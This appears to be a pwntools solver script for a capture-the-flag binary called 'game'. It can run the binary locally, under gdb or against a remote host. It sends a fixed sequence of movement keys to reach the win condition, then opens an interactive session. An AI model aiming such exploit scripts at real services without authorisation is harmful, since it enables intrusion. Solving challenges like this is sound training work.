from pwn import *

target_elf = ELF("./game")

# command line support for local, remote and gdb modes
if len(sys.argv) > 1:
  if "remote" in sys.argv:
    if len(sys.argv) > 3:
      target_proc = remote(sys.argv[2], sys.argv[3])
    else:
      print('usage: ./pwn-game.py remote <server> <port>')
      exit(1)
  elif "gdb" in sys.argv:
    target_proc = target_elf.process()
    gdb.attach(target_proc)
else:
  target_proc = target_elf.process()

target_proc.recvuntil(b'..X')
target_proc.sendline(b'w'*4 + b'a'*8 + b'p')
target_proc.recvuntil(b'You win!')
target_proc.interactive()
